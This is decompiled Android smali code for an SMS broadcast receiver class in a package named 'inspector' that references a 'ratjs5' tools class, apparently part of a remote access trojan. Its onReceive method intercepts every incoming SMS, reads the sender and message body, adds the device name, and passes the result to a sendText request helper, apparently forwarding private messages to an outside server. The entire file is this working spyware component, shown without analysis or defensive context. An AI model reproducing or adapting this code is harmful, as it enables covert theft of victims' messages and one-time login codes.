.class public final Lthisisme/thisapp/inspector/Receiver/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u001e\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\u0008\u0007\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0018\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\u0008H\u0016\u00a8\u0006\t"
    }
    d2 = {
        "Lthisisme/thisapp/inspector/Receiver/SmsReceiver;",
        "Landroid/content/BroadcastReceiver;",
        "()V",
        "onReceive",
        "",
        "context",
        "Landroid/content/Context;",
        "intent",
        "Landroid/content/Intent;",
        "app_debug"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    sget-object v0, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->Int$class-SmsReceiver()I

    move-result v0

    sput v0, Lthisisme/thisapp/inspector/Receiver/SmsReceiver;->$stable:I

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 11
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    const-string v0, "context"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "intent"

    invoke-static {p2, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 15
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v1}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$arg-1$call-EQEQ$cond$cond$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    new-instance v0, Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-direct {v0, p1}, Lthisisme/thisapp/inspector/Utils/AppPermission;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadAndReceiveAndSendSms()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 16
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .local v0, "bundle":Landroid/os/Bundle;
    const/4 v1, 0x0

    .local v1, "msgs":[Landroid/telephony/SmsMessage;
    const/4 v2, 0x0

    .line 19
    .local v2, "msg_from":Ljava/lang/String;
    if-eqz v0, :cond_3

    .line 20
    nop

    .line 21
    :try_start_0
    sget-object v3, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$arg-0$call-get$val-pdus$try$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, [Ljava/lang/Object;

    .line 22
    .local v3, "pdus":[Ljava/lang/Object;
    invoke-static {v3}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    array-length v4, v3

    new-array v4, v4, [Landroid/telephony/SmsMessage;

    move-object v1, v4

    .line 23
    const/4 v4, 0x0

    array-length v5, v1

    :goto_0
    if-ge v4, v5, :cond_3

    move v6, v4

    .local v6, "i":I
    add-int/lit8 v4, v4, 0x1

    .line 24
    aget-object v7, v3, v6

    if-eqz v7, :cond_2

    check-cast v7, [B

    invoke-static {v7}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v7

    aput-object v7, v1, v6

    .line 25
    aget-object v7, v1, v6

    const/4 v8, 0x0

    if-nez v7, :cond_0

    move-object v7, v8

    goto :goto_1

    :cond_0
    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v7

    :goto_1
    move-object v2, v7

    .line 26
    aget-object v7, v1, v6

    if-nez v7, :cond_1

    goto :goto_2

    :cond_1
    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v8

    :goto_2
    move-object v7, v8

    .line 27
    .local v7, "msgBody":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v9}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$0$str$val-text$body$loop$try$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v9}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v9}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$2$str$val-text$body$loop$try$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v9, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v9}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$4$str$val-text$body$loop$try$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 28
    .local v8, "text":Ljava/lang/String;
    new-instance v9, Lthisisme/thisapp/inspector/Utils/AppRequest;

    invoke-direct {v9, p1}, Lthisisme/thisapp/inspector/Utils/AppRequest;-><init>(Landroid/content/Context;)V

    new-instance v10, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;

    invoke-direct {v10, v8}, Lthisisme/thisapp/inspector/Utils/AppRequest$Text;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendText(Lthisisme/thisapp/inspector/Utils/AppRequest$Text;)V

    .end local v7    # "msgBody":Ljava/lang/String;
    .end local v8    # "text":Ljava/lang/String;
    goto :goto_0

    .line 24
    :cond_2
    new-instance v4, Ljava/lang/NullPointerException;

    const-string v5, "null cannot be cast to non-null type kotlin.ByteArray"

    invoke-direct {v4, v5}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "msgs":[Landroid/telephony/SmsMessage;
    .end local v2    # "msg_from":Ljava/lang/String;
    .end local p1    # "context":Landroid/content/Context;
    .end local p2    # "intent":Landroid/content/Intent;
    throw v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 30
    .end local v3    # "pdus":[Ljava/lang/Object;
    .end local v6    # "i":I
    .restart local v0    # "bundle":Landroid/os/Bundle;
    .restart local v1    # "msgs":[Landroid/telephony/SmsMessage;
    .restart local v2    # "msg_from":Ljava/lang/String;
    .restart local p1    # "context":Landroid/content/Context;
    .restart local p2    # "intent":Landroid/content/Intent;
    :catch_0
    move-exception v3

    .line 31
    .local v3, "e":Ljava/lang/Exception;
    sget-object v4, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$arg-0$call-i$catch$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->INSTANCE:Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Receiver/LiveLiterals$SmsReceiverKt;->String$arg-1$call-i$catch$branch$if$branch$if$fun-onReceive$class-SmsReceiver()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 35
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "msgs":[Landroid/telephony/SmsMessage;
    .end local v2    # "msg_from":Ljava/lang/String;
    .end local v3    # "e":Ljava/lang/Exception;
    :cond_3
    return-void
.end method
